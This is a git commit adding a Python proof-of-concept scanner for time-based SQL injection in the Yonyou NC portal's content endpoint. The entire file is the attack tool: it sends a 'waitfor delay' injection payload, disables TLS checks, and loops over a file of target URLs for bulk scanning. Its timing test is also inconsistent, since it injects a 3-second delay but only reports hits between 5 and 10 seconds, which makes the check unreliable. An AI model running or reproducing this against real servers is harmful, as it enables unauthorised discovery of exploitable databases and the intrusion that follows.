224233babc4410fe6d305e81f92b45cca645320b
ATonysan <149130294+ATonysan@users.noreply.github.com>
2024-08-17 17:35:39 +0800

    Add files via upload

---
+++ YongYouNC_content_SQLInject.py
@@ -0,0 +1,43 @@
+import requests
+import urllib3
+from urllib.parse import urljoin,quote
+import argparse
+import ssl
+import re
+ssl._create_default_https_context = ssl._create_unverified_context
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def read_file(file_path):
+    with open(file_path, 'r') as file:
+        urls = file.read().splitlines()
+    return urls
+
+def check(url):
+    url = url.rstrip("/")
+    target = urljoin(url,"/portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:3'--")
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
+    }
+    try:
+        response = requests.get(target, verify=False, headers=headers, timeout=25)
+        if response.status_code == 200 and 5 < response.elapsed.total_seconds() < 10:
+            print(f"\033[31mDiscovered:{url}: YongYouNC_content_SQLInject!\033[0m")
+            return True
+    except Exception as e:
+        pass
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--url", help="URL")
+    parser.add_argument("-f", "--txt", help="file")
+    args = parser.parse_args()
+    url = args.url
+    txt = args.txt
+    if url:
+        check(url)
+    elif txt:
+        urls = read_file(txt)
+        for url in urls:
+            check(url)
+    else:
+        print("help")
